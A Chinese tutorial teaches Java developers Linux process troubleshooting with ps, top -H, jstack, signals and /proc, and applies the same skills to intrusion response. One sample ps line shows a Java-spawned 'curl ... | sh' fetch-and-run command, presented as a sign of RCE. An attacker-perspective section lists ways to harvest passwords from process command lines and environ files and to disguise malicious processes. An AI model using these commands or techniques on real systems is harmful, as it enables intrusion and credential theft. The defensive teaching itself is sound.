## 为什么要学

“线上 CPU 飙到 400%”“服务假死但进程还在”“内存一直涨”，这些你作为 Java 后端一定遇到过。排查它们的第一步永远是操作系统层面：哪个进程？哪个线程？在做什么？打开了哪些文件和连接？这一课的 `top -H`、`jstack`、`/proc` 就是这一步的工具。

在安全路线上，同一套技能用于**入侵排查**：服务器被植入挖矿程序时 CPU 同样飙高，只是元凶换成了一个伪装成 `kworker` 的进程；攻击者的反弹 Shell 是某个 Java 进程下面多出来的 `sh` 子进程；恶意程序删掉自己的文件后仍在运行，只能通过 `/proc/<pid>/exe` 找回来。反过来，`/proc` 也是攻击者的宝库：命令行里的密码、环境变量里的密钥，都可能被同机的其他进程读到。

学完后你应该能：说清进程与线程、父子关系和各种状态；用 `ps`/`top`/`pstree` 快速建立“这台机器在跑什么”的全貌；读懂 load average；正确地停止一个 Java 进程并拿到线程栈；把 `top` 里最忙的线程对应到 Java 代码的具体一行。

:::tip 环境说明
`/proc`、`top -H`、`pstree` 是 Linux 特有或 Linux 版本的行为，macOS 上没有 `/proc`。实践部分给出了在 Docker 容器里跑一个 Linux + JDK 17 环境的方法；如果你有 Linux 云主机或虚拟机也可以直接用。
:::

## 核心概念

### 1. 进程 vs 线程，PID / PPID，前台/后台，守护进程

**进程**是资源分配的单位：独立的虚拟内存空间、打开的文件描述符、用户身份（UID/GID）、环境变量。**线程**是调度的单位：同一进程内的线程共享内存和文件描述符，各自有自己的栈和寄存器。

在 Linux 内核眼里，线程也是一种“任务”（task），每个线程都有自己的 ID（TID）。主线程的 TID 等于进程的 PID，其他线程的 TID 各不相同。一个 Java 进程里有几十上百个线程：`main`、GC 线程、JIT 编译线程、Tomcat 的 `http-nio-8080-exec-*` 工作线程、你的线程池……它们在操作系统层都是独立调度的任务，这就是后面能用 `top -H` 把“最忙的线程”找出来的基础。

```
PID 4200  java -jar app.jar          (process: memory, fds, uid shared by all threads)
 |- TID 4200  main
 |- TID 4215  GC Thread#0
 |- TID 4230  http-nio-8080-exec-1
 |- TID 4231  http-nio-8080-exec-2
```

| | 进程 | 线程 |
|---|---|---|
| 内存 | 相互隔离 | 共享所属进程的内存 |
| 崩溃影响 | 一般不影响其他进程 | 可能拖垮整个进程（如 JVM 崩溃） |
| 创建开销 | 较大（`fork`/`exec`） | 较小 |
| Java 对应 | 一个 JVM | `Thread`，JDK 21 的虚拟线程则是 JVM 在少量平台线程上调度的，不一一对应内核线程 |

**PID 与 PPID**：每个进程由父进程创建（`fork`），PPID 就是父进程的 PID。PID 1 是系统启动的第一个用户态进程（通常是 `systemd`，容器里则是容器的入口进程），是所有进程的祖先。父子关系对安全排查非常重要：**Tomcat/Java 进程下面出现了 `sh`、`bash`、`curl` 子进程**，几乎就是 RCE 的铁证。

**前台 / 后台**：在终端里直接运行的命令占着终端，是前台作业；末尾加 `&` 放到后台运行。常用操作：

| 操作 | 作用 |
|---|---|
| `cmd &` | 后台运行 |
| `Ctrl+Z` | 暂停前台作业（发送 SIGTSTP） |
| `jobs` | 列出当前 Shell 的作业 |
| `bg %1` / `fg %1` | 让 1 号作业在后台继续 / 调回前台 |
| `nohup cmd &` | 忽略终端挂断信号，退出 SSH 后继续运行，输出默认写到 `nohup.out` |

**守护进程（daemon）**：脱离终端、在后台长期运行的服务进程，比如 `sshd`、`nginx`、`mysqld`。传统做法是 fork 两次、`setsid` 脱离控制终端；现在更常见的是交给 systemd 管理（见 [[linux-systemd]]），程序本身在前台运行即可。线上用 `nohup java -jar app.jar &` 启动服务属于“能跑但不规范”：没有崩溃自动重启、日志不轮转、以谁的身份运行也不受控。

### 2. ps / top / htop / pstree，读懂 load average

**ps：进程快照**。两种常用写法：

```
$ ps aux | head -4
USER       PID %CPU %MEM    VSZ   RSS TTY   STAT START   TIME COMMAND
root         1  0.0  0.1 167732 11800 ?     Ss   09:00   0:02 /sbin/init
root       812  0.0  0.1  15432  9120 ?     Ss   09:00   0:00 sshd: /usr/sbin/sshd -D
app       4200 85.3 12.4 5123456 1015880 ? Sl   09:05  12:31 java -Xmx1g -jar /opt/app/app.jar
```

| 列 | 含义 |
|---|---|
| `%CPU` | CPU 使用率，多核时可超过 100% |
| `VSZ` / `RSS` | 虚拟内存 / 实际驻留物理内存（KB）。Java 的 VSZ 通常很大，看 RSS 更有意义 |
| `STAT` | 状态：`R` 运行、`S` 可中断睡眠、`D` 不可中断睡眠（通常在等磁盘/NFS）、`Z` 僵尸、`T` 停止；附加标记 `s` 会话首进程、`l` 多线程、`+` 前台进程组 |
| `TIME` | 累计占用的 CPU 时间 |

另一种写法可以自选列，还能看到父进程：

```
$ ps -eo pid,ppid,user,stat,etime,cmd --sort=-%cpu | head -3
  PID  PPID USER     STAT     ELAPSED CMD
 4200     1 app      Sl         25:12 java -Xmx1g -jar /opt/app/app.jar
 4388  4200 app      S          00:42 /bin/sh -c curl http://203.0.113.9/x.sh | sh
```

第二行就是一个值得立即报警的画面：Java 进程（4200）的子进程在执行下载脚本。

**top：实时视图**。常用交互键：`P` 按 CPU 排序、`M` 按内存排序、`1` 展开每个 CPU 核、`H` 切换线程视图、`c` 显示完整命令行、`q` 退出。`top -H -p <pid>` 只看某个进程的线程。`htop` 是更友好的替代品（彩色、可鼠标操作、树形视图按 `F5`），多数发行版需要另外安装。

**pstree：进程树**，适合一眼看出父子关系：

```
$ pstree -p 4200
java(4200)-+-sh(4388)---curl(4390)
           |-{java}(4201)
           |-{java}(4202)
           ...
```

花括号 `{java}` 表示线程，普通名称是子进程。`pstree -p` 显示 PID，`pstree -u` 显示用户切换。

**load average**：`top` 第一行或 `uptime` 里的三个数：

```
$ uptime
 10:30:01 up 3 days,  2:11,  1 user,  load average: 3.92, 2.10, 1.05
```

三个数分别是过去 **1 分钟、5 分钟、15 分钟**的平均负载。在 Linux 上，负载统计的是**处于可运行状态（R，正在运行或排队等 CPU）和不可中断睡眠状态（D，通常在等 IO）的任务数**的指数加权平均。所以：

- 需要结合 CPU 核数看：4 核机器负载 4 左右表示 CPU 基本被占满；负载 8 表示平均有一半任务在排队。核数用 `nproc` 查看。
- 三个数的趋势比绝对值更有信息量：`3.92, 2.10, 1.05` 说明负载正在上升，问题是最近才出现的。
- 负载高但 CPU 使用率不高，往往是大量 D 状态任务在等磁盘或网络存储，而不是计算密集。
- 挖矿木马通常会让负载长期接近甚至等于核数，并且一直不下降。

### 3. 信号：SIGTERM vs SIGKILL，kill -3 打 Java 线程栈

信号是内核发给进程的异步通知。`kill` 命令的名字有误导性，它的本质是“发信号”：

| 信号 | 编号 | 默认行为 | 能否被捕获/忽略 | 典型用途 |
|---|---|---|---|---|
| SIGHUP | 1 | 终止 | 能 | 终端断开；很多守护进程约定为“重新加载配置”（如 `nginx -s reload` 的效果） |
| SIGINT | 2 | 终止 | 能 | 终端里按 `Ctrl+C` |
| SIGQUIT | 3 | 终止并产生 core dump | 能 | JVM 捕获它，打印线程栈后**继续运行** |
| SIGKILL | 9 | 强制终止 | **不能** | 最后手段 |
| SIGTERM | 15 | 终止 | 能 | `kill` 的默认信号，“请优雅退出” |
| SIGSTOP / SIGCONT | 平台相关 | 暂停 / 继续 | SIGSTOP 不能 | 冻结可疑进程以便取证 |

**SIGTERM vs SIGKILL**：`kill <pid>` 发的是 SIGTERM，JVM 收到后会执行 shutdown hook，Spring Boot 借此关闭 Web 服务器、执行 `@PreDestroy`、关闭连接池；配置 `server.shutdown=graceful` 后还会先等待进行中的请求处理完毕（Spring Boot 3.4 及以后默认就是 graceful）。`kill -9` 发 SIGKILL，进程被内核直接清除，没有任何清理机会：进行中的请求中断、缓冲区里的日志丢失、未提交的业务状态可能不一致。正确顺序是**先 SIGTERM，等待一段时间，还没退出再 SIGKILL**，systemd 和 Kubernetes 停止服务时都是这么做的。

**kill -3 打 Java 线程栈**：给 JVM 发 SIGQUIT，JVM 会把所有线程的栈打印到**该进程自己的标准输出**，然后继续正常运行，不会退出：

```
$ kill -3 4200
```

注意输出不在你执行 `kill` 的终端里，而是在 Java 进程的 stdout：可能是 `nohup.out`、`journalctl -u app` 里的日志，或者 `docker logs`。如果找不到，用 `jstack <pid>`（JDK 自带）或 `jcmd <pid> Thread.print`，它们会把线程栈直接打印到当前终端。前提是用**与目标 JVM 相同的用户**执行，并且机器上装的是 JDK 而不是只有 JRE。

一段线程栈长这样（JDK 17 格式）：

```
"http-nio-8080-exec-3" #42 daemon prio=5 os_prio=0 cpu=15234.12ms elapsed=320.55s tid=0x00007f3a2c1d8000 nid=0x1a2b runnable  [0x00007f39f8bfe000]
   java.lang.Thread.State: RUNNABLE
        at com.aqin.shop.OrderService.calcDiscount(OrderService.java:88)
        at com.aqin.shop.OrderController.preview(OrderController.java:35)
        ...
```

- 引号里是线程名，所以**给线程池起有意义的名字**非常重要。
- `nid` 是这个线程在操作系统里的 ID（即 TID），JDK 17 用**十六进制**显示，`0x1a2b` 就是十进制的 6699。这是和 `top -H` 对应的钥匙。
- `java.lang.Thread.State`：`RUNNABLE`、`BLOCKED`（等锁）、`WAITING`/`TIMED_WAITING`（等条件或 sleep）。大量线程 `BLOCKED` 在同一把锁上，就是“服务假死”的常见原因。

### 4. /proc/<pid>/ 下的 cmdline、environ、fd、maps

Linux 把内核和进程的信息以文件形式暴露在 `/proc` 这个虚拟文件系统里（它不占磁盘，读的时候由内核动态生成）。`/proc/<pid>/` 是每个进程的“档案袋”，排障和取证都靠它：

| 路径 | 内容 | 用途 |
|---|---|---|
| `cmdline` | 完整启动命令行，参数间用 `\0` 分隔 | 看进程到底带了什么参数 |
| `environ` | 进程的环境变量，同样用 `\0` 分隔 | 排查配置；也是密钥泄露点 |
| `cwd` | 符号链接，指向进程当前工作目录 | 定位进程从哪运行 |
| `exe` | 符号链接，指向可执行文件本体 | 即使文件被删，仍能通过它找回/恢复 |
| `fd/` | 进程打开的所有文件描述符（符号链接） | 看它打开了哪些文件、socket、管道 |
| `maps` | 内存映射：加载了哪些 so、jar、地址范围 | 看加载了哪些库，找注入的动态库 |
| `status` | 状态、内存、UID/GID、线程数等汇总 | 快速概览 |
| `task/` | 每个线程一个子目录（以 TID 命名） | 深入到线程级 |

`\0` 分隔的文件直接 `cat` 会连成一串，用 `tr` 换成换行更好读：

```
$ tr '\0' '\n' < /proc/4200/cmdline
java
-Xmx1g
-Dspring.datasource.password=SuperSecret123
-jar
/opt/app/app.jar
```

**为什么把密码放命令行参数里危险？** 因为 `/proc/<pid>/cmdline` 默认对**同机所有用户可读**（`ps aux` 拿到的也是它）。任何登录到这台机器的用户，哪怕权限很低，一条 `ps aux | grep password` 就能看到你的数据库密码。`environ` 相对好一点：它只有进程属主自己和 root 能读，所以“环境变量 > 命令行参数 > 硬编码在代码里”，但环境变量对 root 和被攻陷的同用户进程仍不是秘密，真正的密钥应放进密钥管理服务（见 [[cloud-secrets]]）。

看一个进程打开了什么（能识别出监听端口、日志文件、数据库连接）：

```
$ ls -l /proc/4200/fd | head
lrwx------ 1 app app 64 ... 0 -> /dev/null
lrwx------ 1 app app 64 ... 1 -> /opt/app/logs/app.log
lrwx------ 1 app app 64 ... 200 -> 'socket:[45123]'
```

排查文件句柄泄露（`Too many open files`）时，`ls /proc/<pid>/fd | wc -l` 数出打开的 fd 数量，再和 `cat /proc/<pid>/limits` 里的上限比较。

### 5. 僵尸进程与孤儿进程

这两个概念常被混淆，但完全不同：

- **孤儿进程（orphan）**：父进程先退出了，子进程还活着。它会被 PID 1（init/systemd）“收养”，PPID 变成 1，之后正常运行和回收。孤儿进程无害。
- **僵尸进程（zombie，STAT 为 Z）**：子进程**已经死了**，但父进程还没有调用 `wait()` 读取它的退出状态，于是内核保留一个空壳（只剩退出码等一点信息）在进程表里。僵尸不占 CPU 和内存，但占着一个 PID 表项。

```
$ ps -eo pid,ppid,stat,cmd | awk '$3 ~ /Z/'
 5123  4200 Z    [worker] <defunct>
```

`<defunct>` 就是僵尸的标志。少量僵尸无所谓，但如果**大量堆积**，说明父进程有 bug（fork 了子进程却不 `wait`），可能耗尽 PID。处理办法不是 `kill -9` 僵尸（它已经死了，杀不动），而是**修复或重启父进程**：父进程退出后，僵尸被 init 收养并立即回收。

对 Java 开发者，这个坑最常出现在**容器里**：容器的 PID 1 就是你的入口进程。Java 自己用 `ProcessBuilder` 启动的子进程会被 JDK 回收，但如果子进程（比如 `sh -c` 调起的脚本）又派生了孙进程并先于它退出，这些孤儿会被 PID 1 收养，而 JVM 并不会替它们调用 `wait()`，于是僵尸堆积。另一个常见问题是用 Shell 脚本当入口（`ENTRYPOINT ["sh", "-c", "java -jar app.jar"]`）：此时 PID 1 是 sh，它不会把 `docker stop` 发来的 SIGTERM 转发给 Java，最终等到超时被 SIGKILL。解决办法：入口脚本里用 `exec java ...` 让 Java 替换掉 sh；需要回收孤儿时给容器加一个轻量 init（`docker run --init`，或镜像里的 tini），由它负责回收子进程和转发信号。

## 动手实践

### 实践：找到 Java 进程，用 top -H -p 找出最忙的线程并与 jstack 对应

#### 第 1 步：准备一个 Linux + JDK 17 环境和一个“烧 CPU”的程序

在 Mac 上新建目录 `~/lab/proc`，写一个故意制造热点线程的程序 `Burner.java`：

```java
public class Burner {
    public static void main(String[] args) throws Exception {
        Thread hot = new Thread(Burner::spin, "order-discount-calc");
        hot.start();
        Thread idle = new Thread(() -> {
            try { Thread.sleep(Long.MAX_VALUE); } catch (InterruptedException ignored) { }
        }, "idle-worker");
        idle.start();
        hot.join();
    }

    static void spin() {
        long x = 0;
        while (true) {
            x += System.nanoTime() % 7;   // 死循环，模拟一段有 bug 的计算
        }
    }
}
```

启动一个 Linux 容器（Ubuntu 基础的 Temurin JDK 17 镜像），把目录挂进去，并装上 `ps`/`top`/`pstree`：

```bash
cd ~/lab/proc
docker run --rm -it -v "$PWD:/w" -w /w eclipse-temurin:17-jdk bash
# 以下在容器内执行
apt-get update && apt-get install -y procps psmisc
java Burner.java &
```

如果你有 Linux 服务器，直接在上面执行 `java Burner.java &` 即可，也可以换成自己的 Spring Boot 应用。

#### 第 2 步：找到 Java 进程

```
$ ps -eo pid,ppid,stat,%cpu,cmd | grep [j]ava
   27     1 Sl   99.8 java Burner.java
```

`grep [j]ava` 是个小技巧：正则 `[j]ava` 仍匹配 `java`，但 grep 自己的命令行里是 `[j]ava`，不会把 grep 进程也列出来。`%CPU` 接近 100% 说明大约一个核被占满。也可以用 JDK 自带的 `jps -l` 列出 Java 进程。下面假设 PID 是 27。

#### 第 3 步：top -H -p 找最忙的线程

```
$ top -H -p 27
  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
   45 root      20   0 4536244  52120  24012 R  99.7   0.7   1:02.31 order-discount-
   28 root      20   0 4536244  52120  24012 S   0.0   0.7   0:00.41 java
   29 root      20   0 4536244  52120  24012 S   0.0   0.7   0:00.02 GC Thread#0
   ...
```

读法：

- 加了 `-H` 后，第一列 `PID` 实际上是**线程 ID（TID）**。这里最忙的线程 TID 是 45，占用一个核。
- `COMMAND` 列显示的是内核里的线程名。Linux 限制线程名最多 15 个字符，所以被截断成 `order-discount-`；如果你的 JDK 没有把 Java 线程名同步给操作系统，这里只会显示 `java`，这时就必须靠下一步的 TID 对应。
- 多次观察：一次采样可能是偶然，持续几秒都在前面的线程才是真正的热点。非交互场景可以用 `top -H -b -n 1 -p 27 | head -15` 取一次快照。

#### 第 4 步：把 TID 转成十六进制

jstack（JDK 17）里的 `nid` 是十六进制，所以要先转换：

```
$ printf '%x\n' 45
2d
```

#### 第 5 步：jstack 中找 nid=0x2d

```
$ jstack 27 | grep -A 5 'nid=0x2d '
"order-discount-calc" #13 prio=5 os_prio=0 cpu=62310.52ms elapsed=62.51s tid=0x00007f1c8c1a2800 nid=0x2d runnable  [0x00007f1c5d7fe000]
   java.lang.Thread.State: RUNNABLE
        at Burner.spin(Burner.java:15)
        at Burner$$Lambda$14/0x0000000801001200.run(Unknown Source)
        at java.lang.Thread.run(java.base@17.0.x/Thread.java:833)
```

（地址、编号、JDK 小版本号每次都会不同，形态一致即可。）

读法：

- `nid=0x2d` 对上了 top 里的 TID 45，这就是那个烧 CPU 的线程，名字是 `order-discount-calc`。
- `cpu=62310.52ms` 是该线程累计占用的 CPU 时间，与 top 里的 `TIME+` 大致吻合，可作为二次确认。
- 栈顶 `at Burner.spin(Burner.java:15)` 就是正在执行的代码行：那个死循环。真实项目里，栈顶常见的是正则回溯、死循环、大集合的序列化或频繁 GC。
- grep 模式里 `0x2d` 后面带一个空格，避免误匹配 `0x2d1` 之类更长的 nid。

建议**间隔几秒 jstack 两三次**：如果同一个线程每次都停在同一段代码附近，结论就可靠了。如果最忙的是 `GC Thread` 系列，问题就不是业务代码，而是内存（可以用 `jstat -gcutil 27 1000` 观察 GC 频率）。

:::tip JDK 版本差异
本课基于项目使用的 JDK 17：`nid` 为十六进制。较新的 JDK 版本中线程栈格式有调整（例如在线程编号后直接显示操作系统线程 ID，`nid` 也可能以十进制显示），请以你实际看到的输出为准：如果 nid 不带 `0x`，就直接用十进制 TID 去搜。
:::

一键版脚本（在 Linux 上，把最忙的 3 个线程的栈打出来）：

```bash
pid=27
top -H -b -n 1 -p "$pid" | awk 'NR>7 {print $1}' | head -3 | while read -r tid; do
  nid=$(printf '0x%x' "$tid")
  echo "== TID $tid ($nid) =="
  jstack "$pid" | grep -A 8 "nid=$nid "
done
```

`NR>7` 跳过 top 批处理模式输出的汇总区和表头（不同发行版的行数可能略有差别，先单独运行 `top -H -b -n 1 -p "$pid"` 确认）。收尾：`kill %1` 或 `kill 27` 停掉 Burner，`exit` 退出容器（`--rm` 会自动删除它）。

### 附加练习：亲眼看到命令行里的密码

还在容器里的话，再起一个带“密码”参数的进程，然后换一个普通用户去读它：

```
$ java -Ddb.password=Secret123 Burner.java &
$ useradd -m guest && su guest -c "ps -eo pid,user,args | grep [S]ecret"
   61 root     java -Ddb.password=Secret123 Burner.java
$ su guest -c "cat /proc/61/environ"
cat: /proc/61/environ: Permission denied
```

读法：普通用户 `guest` 能看到 root 进程命令行里的密码，却读不了它的 environ。这就是本课问题的答案，也是“密码不要放命令行”的直接证据。（有些加固过的系统会用 `hidepid` 选项挂载 `/proc`，让用户看不到别人的进程，这时 guest 将看不到这一行。）

## 攻击者视角

> 以下手法只能用于你自己的实验环境或已获授权的目标。

- **拿到低权限 Shell 后先看进程**：`ps auxww` 看所有命令行，寻找 `-Dspring.datasource.password=`、`--password`、`mysql -uroot -p明文`、带 token 的 `curl` 等；再遍历自己有权读取的 `/proc/*/environ` 找云 AK/SK。
- **进程伪装**：挖矿程序把自己改名成 `kworker/0:1`、`[kthreadd]` 之类，混在内核线程里；真正的内核线程在 `ps` 中名字带方括号且没有 `/proc/<pid>/exe` 指向的文件，伪装者会露馅。
- **删除自身文件**：恶意程序运行后删除磁盘上的二进制，`ls -l /proc/<pid>/exe` 会显示 `(deleted)`，但仍可以 `cp /proc/<pid>/exe /tmp/sample` 取出样本分析。
- **躲避 kill**：用 SIGTERM 处理器忽略终止、或者由定时任务/守护进程在被杀后立即拉起。只杀进程不清除持久化（cron、systemd 服务、`~/.bashrc`）是清不干净的。
- **以 Java 进程为跳板**：RCE 后产生的命令都是 Java 进程的子进程。攻击者会尝试用 `nohup`、`setsid` 让进程脱离父进程，从而在进程树中不那么显眼。

排查的顺序因此是：`top` 看谁在烧 CPU → `ps -ef --forest` / `pstree -p` 看父子关系 → `ls -l /proc/<pid>/exe`、`cwd`、`tr '\0' '\n' < cmdline` 看真实身份 → `ls -l /proc/<pid>/fd` 和 [[linux-net]] 中的 `ss -tnp` 看它连向哪里 → 先 `kill -STOP` 冻结保留现场、取证后再清除。

## 防御与最佳实践

- **密钥不进命令行**：Spring Boot 的敏感配置用受限权限的外部配置文件（如 `--spring.config.additional-location=/etc/app/`，文件权限 600），或者从密钥管理服务加载；退而求其次才是环境变量。
- **给线程起名字**：线程池用带名字的 `ThreadFactory`（例如 Spring 的 `ThreadPoolTaskExecutor.setThreadNamePrefix("order-")`），出问题时 `top -H` + `jstack` 能直接看出是哪个业务。
- **优雅停机**：发布脚本用 `kill <pid>` 并等待，超时再 `kill -9`；Spring Boot 开启 `server.shutdown=graceful`，设置 `spring.lifecycle.timeout-per-shutdown-phase`。更好的是交给 systemd 管理（[[linux-systemd]]）。
- **容器入口**：`ENTRYPOINT` 用 exec 形式直接启动 java，或入口脚本最后用 `exec java ...`；需要时加 `--init`。
- **限制 /proc 可见性**：多用户主机可以用 `hidepid=2` 挂载 `/proc`，让用户看不到别人的进程；容器本身也会隔离进程视图（见 [[docker-isolation]]）。
- **监控与告警**：对“Java/Nginx 进程派生出 `sh`/`bash`/`curl`/`wget` 子进程”告警，这是 RCE 最可靠的信号之一；对 CPU 长期打满、`/proc/<pid>/exe` 为 `(deleted)` 的进程告警。
- **排障工具准备好**：生产镜像至少保留 `jcmd`/`jstack` 的使用途径（JDK 镜像或 `jattach` 之类工具），否则出问题时只能干瞪眼。

## 常见误区

- **“kill 就是杀死进程”**：`kill` 默认发 SIGTERM，是“请求退出”；`kill -3` 甚至不会让 JVM 退出。
- **“先 kill -9 最干脆”**：它跳过所有清理逻辑，可能丢日志、断请求、留下不一致的数据，应当是最后手段。
- **“load average 为 4 就是满载”**：要除以 CPU 核数，并且 Linux 的负载也包含等待 IO 的 D 状态任务。
- **“僵尸进程用 kill -9 清掉”**：僵尸已经死了，信号对它无效，要处理的是不回收它的父进程。
- **“top 里看到的 PID 一定是进程”**：加了 `-H` 后那一列是线程 ID。
- **“jstack 的 nid 直接等于 top 里的数字”**：JDK 17 里 nid 是十六进制，要先 `printf '%x'` 转换。
- **“environ 和 cmdline 一样谁都能看”**：cmdline 默认所有用户可读，environ 只有属主和 root 可读，这正是两者安全性不同的原因。

## 自测

:::details 1. 进程和线程在 Linux 里有什么区别？为什么 top -H 能看到 Java 的每个线程？
进程是资源分配单位，拥有独立的内存空间、文件描述符和身份；线程是调度单位，共享进程的资源。Linux 内核把每个线程都当作一个独立调度的任务，有自己的 TID，Java 的平台线程一一对应内核线程，所以 `top -H` 能按线程显示 CPU 占用。
:::

:::details 2. 8 核服务器的 load average 是 `12.5, 6.0, 2.1`，说明了什么？
负载在快速上升，问题是最近几分钟出现的。1 分钟负载 12.5 超过 8 核，意味着有任务在排队。下一步要看 CPU 使用率：如果 CPU 满了，是计算型问题（死循环、挖矿、GC）；如果 CPU 不高，多半是大量 D 状态任务在等 IO。
:::

:::details 3. SIGTERM 和 SIGKILL 的区别是什么？发布脚本应该怎么停服务？
SIGTERM 可以被捕获，JVM 会执行 shutdown hook，Spring Boot 借此优雅关闭；SIGKILL 不能被捕获，进程被内核立即清除。发布脚本应先发 SIGTERM，等待一段时间（例如 30 秒），仍未退出再发 SIGKILL。
:::

:::details 4. 执行了 `kill -3 <pid>`，却没在终端看到线程栈，为什么？
SIGQUIT 让 JVM 把线程栈打印到它自己的标准输出，而不是执行 kill 的终端。要去 Java 进程的 stdout 找，比如 `nohup.out`、`journalctl`、`docker logs`。或者用 `jstack <pid>`、`jcmd <pid> Thread.print` 直接输出到当前终端。
:::

:::details 5. 为什么把密码放在命令行参数里是危险的？
命令行参数保存在 `/proc/<pid>/cmdline`，默认对同机所有用户可读，`ps aux` 就能看到；还会进入 Shell 历史和一些监控系统。任何能登录这台机器的低权限用户或被攻陷的服务都能拿到密码。应改用权限受限的配置文件或密钥管理服务。
:::

:::details 6. top -H 显示最忙线程 TID 为 6699，怎么在 jstack 里找到它？
先转十六进制：`printf '%x\n' 6699` 得到 `1a2b`，再 `jstack <pid> | grep -A 10 'nid=0x1a2b '`。栈顶几行就是它正在执行的代码。（JDK 17 的格式；较新的 JDK 如果 nid 以十进制显示，就直接搜 6699。）
:::

:::details 7. 僵尸进程和孤儿进程有什么区别？僵尸进程要怎么清理？
孤儿进程是父进程已退出、自身仍在运行的进程，会被 PID 1 收养，无害。僵尸进程是已经退出、但父进程还没有 `wait()` 回收的进程残留，状态为 Z。僵尸无法被信号杀死，需要修复或重启父进程，父进程退出后僵尸由 init 回收。
:::

:::details 8. 排查挖矿木马时，发现一个名为 `kworker/0:1` 的进程 CPU 占用 100%，怎么判断它是不是真的内核线程？
真正的内核线程的 PPID 通常是 2（kthreadd），`/proc/<pid>/exe` 没有指向任何文件，`cmdline` 为空。如果 `ls -l /proc/<pid>/exe` 指向 `/tmp/.x/kworker` 之类的文件（或显示 deleted），`cmdline` 非空，就是伪装的用户态程序。
:::

## 一句话总结

进程是资源的容器、线程是调度的单位；用 `top -H -p` 找到最忙的 TID，转成十六进制后在 `jstack` 里找 `nid`，就能定位到代码行；`/proc/<pid>` 既是排障利器，也会暴露你放在命令行里的秘密。
